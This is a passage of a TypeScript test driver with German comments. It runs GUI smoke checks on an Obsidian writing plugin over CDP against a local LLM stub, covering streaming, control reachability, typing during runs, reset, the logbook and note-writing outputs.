    await clickReal(cdp, `document.querySelector(".lt-run")`);
    await pollUntil<{ ok: boolean }>(cdp, `const s = document.querySelector(".lt-status"); return s && !s.classList.contains("is-checking") ? { ok: true } : null;`, 20_000, 500);
  }
  setzeStubModus("kurz");
  const danach = (await count(cdp, ".okit-stream-reasoning")) > 0;
  if (beob?.block === true) {
    record("C8 Gedanken-Block waehrend des Streams", true, `.okit-stream-reasoning stand mit ${beob.laenge} Zeichen da, waehrend .lt-status auf is-checking stand`);
  } else if (!danach) {
    // Zwei sehr verschiedene Gruende landen sonst unter derselben Ueberschrift: „das Modell
    // denkt nicht" und „der Lauf ist gescheitert, bevor ein Gedanke kommen konnte" (Netzfehler,
    // 400, Timeout). Der Beobachtungs-Poll gibt in beiden Faellen `{block:false}` zurueck.
    // Eine Modelleigenschaft zu melden, wo ein Endpunktfehler vorlag, ist genau die Sorte
    // Skip-Grund, gegen die CORE-TEST-19 steht.
    if (await hasClass(cdp, ".lt-status", "is-error")) {
      nichtGemessen("C8 Gedanken-Block waehrend des Streams", `Lauf gescheitert, bevor ein Gedanke kam: ${(await text(cdp, ".lt-status-label")) ?? "?"}`);
    } else {
      nichtGemessen("C8 Gedanken-Block waehrend des Streams", "das gewaehlte Modell lieferte keinen Gedankenstrom (kein reasoning_content) — ohne einen ist der Punkt nicht messbar");
    }
  } else {
    record("C8 Gedanken-Block waehrend des Streams", false, ".okit-stream-reasoning erschien ERST nach dem Lauf — das ist der gemeldete Fehler 3");
  }
}

/** Die Punkte, die ein Ergebnis VORAUSSETZEN — eine Liste, zwei Verwendungen (kein
 *  Endpunkt / kein Ergebnis). Zwei getrennte Listen liefen beim naechsten neuen Punkt
 *  auseinander, und ein vergessener Name faellt nirgends auf: er waere schlicht nicht im
 *  Protokoll, und „nicht gemessen" saehe aus wie „nicht noetig". */
const C_AUSGAENGE = [
  "C2 Kopieren freigegeben", "C3 Notiz ersetzen schreibt Body", "C4 Neue Notiz entsteht",
  "C6 Logbuch anlegen und anhaengen", "C7 Ersetzen-Ziel sperrt bei geaenderter Quelle",
  "C8 Gedanken-Block waehrend des Streams",
  "C8b Gedanken-Text waechst waehrend des Streams",
  "C8c Denkblock kopierbar: der Knopf legt den Denktext in die Zwischenablage, der Block klappt nicht um",
  "C8d Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht",
  "C9 jedes Bedienelement ist erreichbar (natuerliche Hoehe)",
  "C9b jedes Bedienelement ist erreichbar (kurzes Panel, 420 px)",
  "C9c Gegenprobe: ohne Rollbalken wird etwas unerreichbar",
  "C9d Quell-Textfeld und Regler erreichbar (Quelle Textfeld)",
  "C10 Zuruecksetzen fragt nach und raeumt",
];
// B11 haengt am ERSTEN Lauf, nicht an dessen Ergebnis: er wird gemessen, sobald der Lauf
// endet — auch wenn er scheitert, denn der Schluss-Draw laeuft in beiden Faellen. Er gehoert
// deshalb NICHT in C_AUSGAENGE (dort wuerde er zusaetzlich als uebersprungen gefuehrt und
// stuende doppelt im Protokoll), wohl aber in C_NAMEN: ohne Endpunkt gibt es keinen Lauf.
const C_NAMEN = ["C5 is-checking animiert", "C11 Panel folgt dem Strom", "C11b Hochscrollen im Strom wird respektiert", "C1 Stream liefert Ergebnis", "B11 Tippen ueberlebt das Ende eines Laufs", "B11b Tippen im Quelltextfeld ueberlebt das Ende eines Laufs", ...C_AUSGAENGE];

/** C9 — Pflicht-Punkt (b) aus dem Skill `gui-smoke-setup` § 3a, seit 2026-09-11 mit neuer
 *  Frage: **ist jedes Bedienelement ERREICHBAR?**
 *
 *  Bis dahin lautete sie „wird etwas verdeckt?", weil das Panel seine Hoehe aufteilte und
 *  nur die Vorschau rollte — ein Knopf konnte unter einem ueberlaufenden Bereich
 *  verschwinden. Das Panel ist jetzt EIN Rollbereich: nichts wird mehr verdeckt oder
 *  abgeschnitten, dafuer steht vieles ausserhalb des Sichtfensters. „Nicht sichtbar" ist
 *  damit kein Fehler mehr — „nicht erreichbar" schon. Gemessen wird deshalb je Element:
 *  hinscrollen (`scrollIntoView`), dann `elementFromPoint` auf seine Mitte. Trifft es sich
 *  selbst, ist es bedienbar.
 *
 *  Geprueft werden nicht nur die Knoepfe: auch das Quell-Textfeld (`.lt-freetext`, nur bei
 *  Quelle „Textfeld" im DOM) und der erste Regler — die waren es, die in der alten
 *  Aufteilung bei 420 px Panelhoehe unerreichbar wurden.
 *
 *  ⚠️ Der Punkt ist wertlos, solange das Panel nicht UEBERLAEUFT (CORE-TEST-01).
 *  Das Ergebnis eines Smoke-Laufs ist dafuer zu kurz — deshalb wird der Bereich vorher
 *  aufgefuellt und die Vorbedingung im Detailtext mitgemeldet, damit sichtbar bleibt, ob
 *  der Punkt ueberhaupt haette rot werden koennen.
 *
 *  Gemessen wird in ZWEI Lagen: natuerliche Panelhoehe (C9) und kuenstlich auf 420 px
 *  gedrueckte Leaf-Hoehe (C9b). Eine einzelne Hoehe misst nur den Rechner, auf dem sie
 *  lief; die zweite Lage kostet vier Zeilen und deckt den geteilten Seitenbereich ab.
 *  Ein Element ohne Flaeche zaehlt als unerreichbar.
 *
 *  ⚠️ Zwei Fallen im Renderer-Ausdruck, beide hier hineingelaufen: `cdp.evaluate` schickt
 *  ihn als STRING, und er steht im Treiber in einem Template-Literal. Ein echtes Newline
 *  darin (etwa aus einem `join`) bricht drueben das String-Literal auf, ein Backtick im
 *  KOMMENTAR beendet das Template-Literal schon hier. Das erste kostet den ganzen Lauf
 *  („ABBRUCH: Renderer: Uncaught", alles danach ungemessen), das zweite faellt wenigstens
 *  im Typecheck auf. Deshalb: Zeilen als eigene Elemente, keine Backticks in Kommentaren
 *  innerhalb eines Renderer-Ausdrucks. */
async function pruefeUeberdeckung(cdp: Cdp): Promise<void> {
  const C9 = "C9 jedes Bedienelement ist erreichbar (natuerliche Hoehe)";
  const C9b = "C9b jedes Bedienelement ist erreichbar (kurzes Panel, 420 px)";
  const C9c = "C9c Gegenprobe: ohne Rollbalken wird etwas unerreichbar";
  // Bausteine aus `tools/obsidian-cdp/pflichtpunkte.ts` (Welle 23, Pilot): Fuellen mit echtem Inhalt, Ueberlauf am Panel (EIN Rollbereich),
  // Gegenprobe ohne Rollbalken. Vom Regler zaehlt nur der erste (vier gleiche Zeilen untereinander).
  const opts = {
    selektoren: BEDIENELEMENTE,
    nurErster: [".lt-dial-input"],
    fuelle: { in: ".okit-stream-body" },
    ueberlauf: ".lt-panel",
    erforderlich: [".lt-run", ".lt-dial-input"],
  };
  zeichnePflicht(pflichtBilanz, C9, await messeErreichbarkeit(cdp, opts));
  // Zweite Lage: ein geteilter rechter Seitenbereich (zwei gestapelte Panels) ist der Normalfall, nicht die Verrenkung. Das Leaf ueber dem
  // Panel, nicht das erste `.workspace-leaf` des Dokuments (das waere der Editor): `:has(.lt-panel)`.
  const kurz = await mitHoehe<PflichtTeilurteil>(cdp, { element: ".workspace-leaf", enthaelt: ".lt-panel", hoehe: 420 }, () => messeErreichbarkeit(cdp, opts));
  zeichnePflicht(pflichtBilanz, C9b, kurz);
  zeichnePflicht(pflichtBilanz, C9c, await gegenprobeErreichbarkeit(cdp, { selektoren: BEDIENELEMENTE, nurErster: [".lt-dial-input"], rollbereich: ".lt-panel", fuelle: { in: ".okit-stream-body" } }));
}

/** Die bedingungslos zu pruefenden Bedienelemente des Panels (`.lt-freetext` gibt es nur bei der Quelle Textfeld, dafuer C9d). */
const BEDIENELEMENTE = [".lt-run", ".lt-refine", ".lt-reset", ".lt-out", ".lt-freetext", ".lt-dial-input"];

/** B11 — Fehler 1 in seinem schmaleren Fenster: der Voll-Draw am ENDE eines Laufs.
 *
 *  Die Anmerkung ist waehrend eines Streams absichtlich NICHT gesperrt; der Nutzer tippt dort
 *  die naechste Runde, waehrend er auf das Ergebnis wartet. `run()` schliesst mit einem
 *  bedingungslosen `draw()` ab, und das ersetzte bis 2026-09-08 das Feld unter dem Cursor.
 *  Einmal je Lauf statt bei jedem Tastendruck — und in dem Moment, in dem niemand hinsieht.
 *
 *  Gemessen in der B10-Form: Mutation getrennt, danach ein Fenster auf den NEGATIVEN Zustand.
 *  Die Mutation laeuft WAEHREND des Streams, gemessen wird NACH seinem Ende. Nummer nach
 *  Fehlerbild (B10s Zwilling), Ort nach Abhaengigkeit — ohne echten Lauf ist er nicht messbar.
 *  Der Rueckgabewert sagt, ob gemessen werden konnte.
 *
 *  `.lt-freetext` (Quelle „Textfeld") durchlaeuft denselben `render()`/`sourceRow()`-Codepfad
 *  wie `.lt-note` (0.1.1-Nachlese, Review-Punkt: „derselbe Codepfad, kein eigener Pruefpunkt").
 *  Selektor und Anzeigename sind deshalb Parameter statt zweiter Kopie — B11b (unten) ruft
 *  dieselben zwei Funktionen mit `.lt-freetext` auf. */
async function tippeWaehrendDesLaufs(cdp: Cdp, selector = ".lt-note"): Promise<boolean> {
  return (await cdp.evaluate<{ ok: boolean }>(`
    const el = document.querySelector(${q(selector)});
    if (!el) return { ok: false };
    el.focus();
    el.value = "";
    el.dispatchEvent(new Event("input", { bubbles: true }));
    document.execCommand("insertText", false, "abc");
    document.dispatchEvent(new Event("selectionchange"));
    return { ok: true };
  `)).ok;
}

async function messeB11(cdp: Cdp, selector = ".lt-note", name = "B11 Tippen ueberlebt das Ende eines Laufs"): Promise<void> {
  // Die Mutation lief WAEHREND des Stroms (`tippeWaehrendDesLaufs`); hier nur das Fenster auf den negativen Zustand (Baustein `pflichtpunkte`).
  zeichnePflicht(pflichtBilanz, name, await messeFokusFenster(cdp, { selector, text: "abc" }));
  await cdp.evaluate(fokusAufraeumSkript(selector));
}

/** B11b — dieselbe Frage wie B11, fuer die Quelle „Textfeld" (`.lt-freetext`) statt „Aktive
 *  Notiz" (`.lt-note`): derselbe render()/sourceRow()-Codepfad, 0.1.1-Nachlese-Review-Punkt
 *  „derselbe Codepfad, kein eigener Pruefpunkt".
 *
 *  EIGENER dritter Lauf, nicht in C6 (zweiter Lauf) gefaltet: C3/C4 direkt nach C6 brauchen,
 *  dass die Session-Runde von C6 zur LEBENDEN Notiz passt (`canReplaceNote` vergleicht
 *  `cap.text` mit dem Text, der tatsaechlich getunt wurde) — ein C6-Lauf mit Quelle „Textfeld"
 *  verletzt das und macht `.lt-out-replace-note` disabled, WEIL sourceText (Platzhaltertext)
 *  nie zur Notiz passt. Erster Entwurf (2026-09-17) faltete B11b in C6 und riss dabei C3 rot
 *  („Notiz ersetzen schreibt Body" — Datei blieb unveraendert, weil der Knopf gesperrt war).
 *  Deshalb hier, NACH C3/C4/C8/C9d: nichts danach haengt mehr an einer Notiz-Quelle passenden
 *  Session-Runde — C10 setzt die Sitzung ohnehin komplett zurueck. */
async function pruefeB11bFreetext(cdp: Cdp): Promise<void> {
  const name = "B11b Tippen im Quelltextfeld ueberlebt das Ende eines Laufs";
  const klick = await waehleQuelle(cdp, 2);
  const da = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelector(".lt-freetext") ? { ok: true } : null;`, 3000, 200);
  if (da === null) {
    nichtGemessen(name, `Quelle „Textfeld" liess sich nicht waehlen${klick}`);
    await waehleQuelle(cdp, 1).catch(() => "");
    return;
  }
  await cdp.evaluate(`
    const ta = document.querySelector(".lt-freetext");
    ta.value = "Quelltext fuer B11b, damit die Quelle bereit ist.";
    ta.dispatchEvent(new Event("input", { bubbles: true }));
    return { ok: true };
  `);
  let getippt = false;
  // Ergebnis des Laufs ist hier egal (wie bei B11 auf .lt-note): der Schluss-Draw laeuft
  // sowohl bei Erfolg als auch bei einem Fehler.
  await laufeTune(cdp, async () => { getippt = await tippeWaehrendDesLaufs(cdp, ".lt-freetext"); });
  if (getippt) await messeB11(cdp, ".lt-freetext", name);
  else nichtGemessen(name, "Tippen waehrend des Laufs schlug fehl — .lt-freetext war beim Klick nicht im DOM");
  await waehleQuelle(cdp, 1).catch(() => "");
}

/** C9d — das Quell-Textfeld, und zwar wirklich gemessen.
 *
 *  C9/C9b laufen mitten in Teil C, wo die Quelle auf „Aktive Notiz" steht; `.lt-freetext`
 *  existiert dann gar nicht und wird dort nur als „nicht im Panel" protokolliert. Ausgerechnet
 *  dieses Feld war am 2026-09-07 der erste gemeldete Schaden (mit `rows="6"` angefordert, auf
 *  eine halbe Zeile eingedampft) — ein Pruefpunkt, der es nie beruehrt, deckt den Anlassfall
 *  nicht ab (Review M9).
 *
 *  Deshalb ein EIGENER kleiner Punkt am Ende von Teil C: Quelle auf „Textfeld", fuellen,
 *  Textfeld und ersten Regler messen, Quelle im `finally` zurueck. Am Ende, weil der
 *  Quellenwechsel C3/C7 die Vorbedingung naehme. */
async function pruefeTextfeldErreichbar(cdp: Cdp): Promise<void> {
  const name = "C9d Quell-Textfeld und Regler erreichbar (Quelle Textfeld)";
  let gewechselt = false;
  try {
    const klick = await waehleQuelle(cdp, 2);
    const ta = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelector(".lt-freetext") ? { ok: true } : null;`, 3000, 200);
    if (ta === null) { nichtGemessen(name, `Quelle „Textfeld" liess sich nicht waehlen${klick}`); return; }
    gewechselt = true;
    zeichnePflicht(pflichtBilanz, name, await messeErreichbarkeit(cdp, {
      selektoren: [".lt-freetext", ".lt-dial-input"],
      nurErster: [".lt-dial-input"],
      fuelle: { in: ".okit-stream-body" },
      ueberlauf: ".lt-panel",
      erforderlich: [".lt-freetext", ".lt-dial-input"],
    }));
  } finally {
    // Die Quelle ist Zustand des Wirts, nicht des Pruefpunkts: sie geht auch dann zurueck,
    // wenn die Messung wirft.
    if (gewechselt) await waehleQuelle(cdp, 1).catch(() => "");
  }
}

/** C10 — Zuruecksetzen fragt nach, wenn Runden existieren, und raeumt danach wirklich. */
async function pruefeZuruecksetzen(cdp: Cdp): Promise<void> {
  const vor = await cdp.evaluate<{ reset: number; runden: number; vorschau: number }>(`
    return {
      reset: document.querySelectorAll(".lt-reset").length,
      runden: app.workspace.getLeavesOfType(${q(VIEW_TYPE)})[0].view.session.rounds.length,
      vorschau: (document.querySelector(".lt-preview") || { textContent: "" }).textContent.trim().length,
    };
  `);
  if (vor.reset !== 1 || vor.runden === 0) {
    nichtGemessen("C10 Zuruecksetzen fragt nach und raeumt", `Vorbedingung fehlt: .lt-reset=${vor.reset}, Runden=${vor.runden} — ohne Runde gibt es keine Rueckfrage zu messen`);
    return;
  }
  await clickReal(cdp, `document.querySelector(".lt-reset")`);
  const modal = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelector(".modal-button-container") ? { ok: true } : null;`, 5000, 200);
  if (modal === null) {
    record("C10 Zuruecksetzen fragt nach und raeumt", false, `kein Bestaetigungsdialog nach dem Klick — ${vor.runden} Runden waeren ungefragt weg gewesen`);
    return;
  }
  await clickReal(cdp, `Array.from(document.querySelectorAll(".modal-button-container button")).at(-1)`);
  const leer = await pollUntil<{ reset: number; runden: number; leerzustand: number }>(cdp, `
    const v = app.workspace.getLeavesOfType(${q(VIEW_TYPE)})[0].view;
    if (v.session.rounds.length !== 0) return null;
    return {
      reset: document.querySelectorAll(".lt-reset").length,
      runden: v.session.rounds.length,
      leerzustand: document.querySelectorAll(".lt-empty").length,
    };
  `, 5000, 250);
  record("C10 Zuruecksetzen fragt nach und raeumt", leer !== null && leer.reset === 0 && leer.leerzustand === 1,
    leer === null ? `Dialog bestaetigt, aber die Sitzung steht noch (${vor.runden} Runden)`
                  : `Rueckfrage kam, danach 0 Runden, .lt-reset weg, Leerzustand da (vorher ${vor.runden} Runden, ${vor.vorschau} Zeichen)`);
}

/** Modell fuer Abschnitt C: Flag `--model <id>`. Ohne Flag und ohne konfiguriertes Modell misst C nichts. */
let MODELL_FLAG: string | undefined;

/** Antworten des zentralen Stubs in Abschnitt C. `lang`: genug Absaetze, dass das Panel zur Stoerzeit um mindestens 80 px
 *  ueberlaeuft (Mindestueberlauf der Folge-Messung) und danach noch Stuecke fuer Stoerung UND Wiederaufnahme kommen; `kurz`: ein Dreizeiler (die uebrigen Laeufe); `denken`: langer Denk-Text, dann das Ergebnis (C8, wird abgebrochen). */
type StubModus = "lang" | "kurz" | "denken";
const STUB_MODELL = "stub-modell";
const STUB_TAKT_MS = 200;
const STUB_LANG = Array.from({ length: 60 }, (_, i) => `${i === 0 ? "" : "\n\n"}Absatz ${i + 1}: Der Entwurf bleibt in der Sache gleich, klingt aber ruhiger und laesst dem Empfaenger mehr Raum.`);
const STUB_KURZ = ["Hallo Sam,", "\n\nkannst du mir den Bericht bis Freitag schicken?", "\n\nDanke, Jo"];
function stubAntwort(modus: StubModus): AntwortSpec {
  // Tokengross (laenge 8, kurzer Takt), nicht absatzgross: ein Push ueber die 40-px-Folge-Schwelle beendet im Kit 0.57.0 das Folgen
  // (Befund kuro-w20, Rundschreiben 3) — dann misst die Kontrolle „folgt ohne Stoerung“ die Stueckgroesse statt den Bereich.
  // `--stub-stuecke absatz` fuehrt die absatzgrossen Stuecke (B2: auf dem alten Pin rot, ab Kit 0.59.0 gruen).
  if (modus === "lang") return STUB_STUECKE === "absatz" ? { stuecke: STUB_LANG, model: STUB_MODELL } : { text: STUB_LANG.join(""), laenge: 8, takt: 20, model: STUB_MODELL };
  if (modus === "denken") return { reasoning: "Ich wäge Ton und Länge gegeneinander ab. ".repeat(40), laenge: 24, text: STUB_KURZ.join(""), model: STUB_MODELL };
  return { stuecke: STUB_KURZ, model: STUB_MODELL };
}
let stubModus: StubModus = "kurz";
/** Schaltet die Antwort des Stubs um; ohne Stub (`--model`, echter Server) ohne Wirkung. */
let stubAktiv = false;
function setzeStubModus(m: StubModus): void { if (stubAktiv) stubModus = m; }
/** `--stub-laenge kurz` fuer die Gegenprobe der Gueltigkeitsbedingung von C11b (kurze Antwort → „nichts gemessen"). */
let STUB_LAENGE: StubModus = "lang";
/** Stueckgroesse der langen Antwort: `token` (Default) oder `absatz`. */
let STUB_STUECKE: "token" | "absatz" = "token";

/** Abschnitt C. Ohne `--model` gegen den zentralen LLM-Stub (Welle 20), mit `--model <id>` gegen den echten Server auf :1234
 *  (in Welle 20 nicht gefahren: LM Studio und Ollama laufen aus). */
async function pruefeLauf(cdp: Cdp): Promise<void> {
  console.log("\nC · Lauf mit Modell");
  if (MODELL_FLAG !== undefined) { await pruefeLaufKern(cdp); return; }
  const echterEndpunkt = ENDPOINT;
  const stub = await startLlmStub({ models: [STUB_MODELL], takt: STUB_TAKT_MS, nachlaufMs: 3 * STUB_TAKT_MS, antwort: () => stubAntwort(stubModus) });
  const vorher = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints };`)).eps;
  try {
    stubAktiv = true;
    stubModus = "kurz";
    ENDPOINT = stub.url;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(stub.url)}, model: ${q(STUB_MODELL)} }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `);
    console.log(`  · Abschnitt C laeuft gegen den zentralen LLM-Stub (${stub.url}, Takt ${STUB_TAKT_MS} ms), nicht gegen ${echterEndpunkt}`);
    await pruefeLaufKern(cdp);
  } finally {
    stubAktiv = false;
    ENDPOINT = echterEndpunkt;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      if (!p) return { ok: false };
      p.settings.endpoints = ${JSON.stringify(vorher)};
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `).catch(() => null);
    await stub.stop();
  }
}

async function pruefeLaufKern(cdp: Cdp): Promise<void> {
  if (!(await endpointReachable())) {
    for (const n of C_NAMEN) nichtGemessen(n, `kein Endpunkt auf ${ENDPOINT}`);
    return;
  }
  const vorabModell = (await cdp.evaluate<{ m: string }>(`return { m: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints[0]?.model ?? "" };`)).m;
  if (vorabModell === "" && MODELL_FLAG === undefined) {
    for (const n of C_NAMEN) nichtGemessen(n, "kein Modell gewaehlt: --model <id> setzen (die Reihenfolge der Server-Liste ist kein Auswahlkriterium)");
    return;
  }
  const vorher = (await cdp.evaluate<{ t: string }>(`return { t: await app.vault.read(app.vault.getAbstractFileByPath(${q(NOTE)})) };`)).t;
  let logbuchAn = false;
  let denkenAn = false;
  let modellGeaendert = false;
  let modellVorwert = "";
  try {
    // Das Fixture ueberlaesst die Modellwahl dem Server („Server waehlt das Modell", model: "").
    // Das traegt nur, solange dort GENAU EIN Modell geladen ist. Gemessen 2026-09-07, 23:2x:
    // bei mehreren geladenen Modellen antwortet LM Studio mit 400 — auf `model: ""` mit
    // „Invalid model identifier", auf ein FEHLENDES Feld mit „Multiple models are loaded".
    // Das ist eine Eigenschaft des Endpunkts, kein Plugin-Defekt (beide Nutzlast-Formen per
    // curl gegengeprueft). Der Treiber waehlt deshalb selbst eines — aus der Liste des
    // Servers, nie hart verdrahtet: ein Modellname im Repo waere die Modell-Bibliothek eines
    // bestimmten Rechners.
    const konfiguriert = (await cdp.evaluate<{ m: string }>(`return { m: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints[0]?.model ?? "" };`)).m;
    if (konfiguriert === "") {
      const ids = await modelle();
      const gewaehlt = MODELL_FLAG;
      if (gewaehlt !== undefined && !ids.includes(gewaehlt)) throw new Error(`--model ${gewaehlt} steht nicht in der Liste des Servers (${ids.length} Modelle)`);
      if (gewaehlt !== undefined) {
        modellGeaendert = true;
        modellVorwert = konfiguriert;
        // Der Panel-Weg: `setModel` der Verbindung schreibt das Modell der aktiven Zeile, speichert und loest neu auf.
        await cdp.evaluate(`const p = app.plugins.plugins[${q(PLUGIN_ID)}]; await p.llm.setModel(${q(gewaehlt)}); return { ok: true };`);
        console.log(`  · Modell fuer diesen Lauf gesetzt: ${gewaehlt} (Einstellung war „Server waehlt", ${ids.length} Modelle geladen)`);
      }
    }
    // C6 braucht das Logbuch VOR dem ersten Lauf — es schreibt beim Abschluss eines Laufs.
    await cdp.evaluate(`
      const f = app.vault.getAbstractFileByPath(${q(LOGBOOK_FOLDER)});
      if (f) await app.vault.delete(f, true);
      return { ok: true };
    `);
    await setPluginSetting(cdp, PLUGIN_ID, "logbookEnabled", true);
    logbuchAn = true;

    // --- Lauf 1: Stream, Animation, Ausgaenge -------------------------------------
    setzeStubModus(STUB_LAENGE); // VOR dem Klick: die Antwort wird mit der Anfrage gewaehlt
    await clickReal(cdp, `document.querySelector(".lt-run")`);
    // C5 waehrend des Streams messen: danach steht die Klasse auf is-ok und die Frage ist weg.
    const anim = await pollUntil<{ a: string; reduced: boolean }>(cdp, `
      const s = document.querySelector(".lt-status");
      if (!s || !s.classList.contains("is-checking")) return null;
      const svg = document.querySelector(".lt-status-icon svg");
      if (!svg) return null;
      return { a: getComputedStyle(svg).animationName, reduced: matchMedia("(prefers-reduced-motion: reduce)").matches };
    `, 15_000, 150);
    // C5 wird waehrend des Streams gemessen und deshalb auch hier protokolliert — vor C1,
    // damit die Reihenfolge im Protokoll die Reihenfolge der Messung ist.
    if (anim === null) {
      nichtGemessen("C5 is-checking animiert", "der Zustand is-checking war in 15 s nie zusammen mit einem .lt-status-icon svg zu sehen");
    } else if (anim.reduced) {
      skipped("C5 is-checking animiert", `System steht auf prefers-reduced-motion: reduce — styles.css schaltet die Animation dort absichtlich ab (animationName=${anim.a})`);
    } else {
      record("C5 is-checking animiert", anim.a === "lt-spin", `animationName=${anim.a}`);
    }

    // B11: WAEHREND des Streams in die Anmerkung tippen — gemessen wird nach dem Schluss-Draw.
    const getippt = await tippeWaehrendDesLaufs(cdp);

    // C11, C11b, C11c: eine Messung, drei Teilregeln, ein Strom (`messeFolge` der Bruecke, README § Folge-Messung). Das Panel als Ganzes
    // scrollt (`.lt-panel`), nicht der Stream-Bereich. Der Strom laeuft, solange `.lt-status` auf is-checking steht; die Werte
    // (Ueberlauf >= 80, >= 3 Staende, 24 px, 4 px Toleranz) sind die der Bruecke — ein Hebel fuer „nichts gemessen“ ist die Stub-Laenge.
    const folge = await messeFolge(cdp, {
      selector: ".lt-panel",
      laeuft: () => hasClass(cdp, ".lt-status", "is-checking"),
      wiederaufnahme: true,
    });
    zeichneFolge({ record, unmeasured: nichtGemessen }, {
      kontrolle: "C11 Panel folgt dem Strom",
      folge: "C11b Hochscrollen im Strom wird respektiert",
      wiederaufnahme: "C11c Zurueck am Ende folgt das Panel wieder",
    }, folge);
    setzeStubModus("kurz");
    const done = await pollUntil<{ ok: boolean }>(cdp, `const s = document.querySelector(".lt-status"); return s && (s.classList.contains("is-ok") || s.classList.contains("is-error")) ? { ok: true } : null;`, 120_000, 500);
    if (getippt) await messeB11(cdp);
    else nichtGemessen("B11 Tippen ueberlebt das Ende eines Laufs", "keine .lt-note im Panel — ohne Eingabefeld ist der Punkt gegenstandslos");
    const ok = done !== null && (await hasClass(cdp, ".lt-status", "is-ok"));
    const preview = (await text(cdp, ".lt-preview")) ?? "";
    record("C1 Stream liefert Ergebnis", ok && preview.length > 0, ok ? `${preview.length} Zeichen, Anfang: „${preview.slice(0, 80).replace(/\s+/g, " ")}“` : `Status: ${(await text(cdp, ".lt-status")) ?? "?"}`);

    if (!ok) {
      for (const n of C_AUSGAENGE) nichtGemessen(n, "Lauf 1 lieferte kein Ergebnis — die Ausgaenge sind ohne eines gegenstandslos");
      return;
    }
    record("C2 Kopieren freigegeben", (await disabled(cdp, ".lt-out-copy")) === false, `disabled=${await disabled(cdp, ".lt-out-copy")}`);

    // C9 hier, nicht spaeter: ein Ergebnis steht, die Ausgangsknoepfe sind frei, und C3/C4
    // veraendern danach Quelle und aktiven Tab.
    await pruefeUeberdeckung(cdp);

    // --- C7 VOR C3/C4: beide veraendern die Quelle bzw. wechseln den aktiven Tab ---
    const vorGuard = await disabled(cdp, ".lt-out-replace-note");
    if (vorGuard !== false) {
      nichtGemessen("C7 Ersetzen-Ziel sperrt bei geaenderter Quelle", `Vorbedingung fehlt: .lt-out-replace-note war schon vor der Aenderung disabled=${vorGuard}`);
    } else {
      await cdp.evaluate(`
        const leaf = app.workspace.getMostRecentLeaf(app.workspace.rootSplit);
        leaf.view.editor.replaceRange("X", { line: 0, ch: 0 });
        app.workspace.trigger("active-leaf-change");
        return { ok: true };
      `);
      const gesperrt = await pollUntil<{ ok: boolean }>(cdp, `const b = document.querySelector(".lt-out-replace-note"); return b && b.disabled ? { ok: true } : null;`, 5000, 250);
      record("C7 Ersetzen-Ziel sperrt bei geaenderter Quelle", gesperrt !== null, gesperrt !== null ? "Quelle geaendert → .lt-out-replace-note disabled" : `disabled=${await disabled(cdp, ".lt-out-replace-note")}`);
      await cdp.evaluate(`
        const leaf = app.workspace.getMostRecentLeaf(app.workspace.rootSplit);
        leaf.view.editor.replaceRange("", { line: 0, ch: 0 }, { line: 0, ch: 1 });
        app.workspace.trigger("active-leaf-change");
        return { ok: true };
      `);
      await pollUntil<{ ok: boolean }>(cdp, `const b = document.querySelector(".lt-out-replace-note"); return b && !b.disabled ? { ok: true } : null;`, 5000, 250);
    }

    // --- C6: zweiter Lauf, danach traegt das Logbuch zwei Eintraege ---------------
    const ok2 = await laufeTune(cdp);
    const logbuch = await pollUntil<{ text: string; path: string }>(cdp, `
      const f = app.vault.getMarkdownFiles().find((x) => x.path.startsWith(${q(`${LOGBOOK_FOLDER}/LingoTuner `)}));
      if (!f) return null;
      const t = await app.vault.read(f);
      return (t.match(/^## /gm) || []).length >= 2 ? { text: t, path: f.path } : null;
    `, 15_000, 500);
    if (!ok2) {
      nichtGemessen("C6 Logbuch anlegen und anhaengen", `der zweite Lauf lieferte kein Ergebnis (Status: ${(await text(cdp, ".lt-status")) ?? "?"}) — ohne zwei fertige Laeufe ist der Punkt nicht messbar`);
    } else {
      const kopf = logbuch !== null && logbuch.text.startsWith("---\ntype: lingotuner-log\n---\n");
      const n = logbuch === null ? 0 : (logbuch.text.match(/^## /gm) ?? []).length;
      record("C6 Logbuch anlegen und anhaengen", logbuch !== null && kopf, logbuch === null ? `keine Datei ${LOGBOOK_FOLDER}/LingoTuner YYYY-MM.md mit zwei Eintraegen` : `${logbuch.path}: Frontmatter type: lingotuner-log, ${n} Eintraege`);
    }

    // --- C3/C4: die schreibenden Ausgaenge ----------------------------------------
    const stand = (await cdp.evaluate<{ t: string }>(`return { t: await app.vault.read(app.vault.getAbstractFileByPath(${q(NOTE)})) };`)).t;
    await clickReal(cdp, `document.querySelector(".lt-out-replace-note")`);
    // Kit-Confirm: Bestaetigen-Knopf ist der rechte im modal-button-container.
    await pollUntil<{ ok: boolean }>(cdp, `return document.querySelector(".modal-button-container") ? { ok: true } : null;`, 5000, 200);
    await clickReal(cdp, `Array.from(document.querySelectorAll(".modal-button-container button")).at(-1)`);
    const changed = await pollUntil<{ t: string }>(cdp, `const t = await app.vault.read(app.vault.getAbstractFileByPath(${q(NOTE)})); return t !== ${q(stand)} ? { t } : null;`, 10_000, 500);
    record("C3 Notiz ersetzen schreibt Body", changed !== null && changed.t.startsWith("---\ntype: draft\n---"), changed !== null ? "Body ersetzt, Frontmatter steht" : `Datei unveraendert; Notices: ${await notices(cdp).catch(() => "?")}`);

    await clickReal(cdp, `document.querySelector(".lt-out-new-note")`);
    const neu = await pollUntil<{ p: string }>(cdp, `const f = app.vault.getMarkdownFiles().find((x) => x.basename.includes("(tuned)") || x.basename.includes("(getunt)")); return f ? { p: f.path } : null;`, 10_000, 500);
    record("C4 Neue Notiz entsteht", neu !== null, neu?.p ?? "keine Datei mit (tuned)/(getunt)");
    if (neu !== null) await cdp.evaluate(`await app.vault.delete(app.vault.getAbstractFileByPath(${q(neu.p)})); return { ok: true };`);

    // --- C8: der Lauf wird abgebrochen und hinterlaesst eine Teilrunde -----------
    denkenAn = true;
    await pruefeGedanken(cdp);

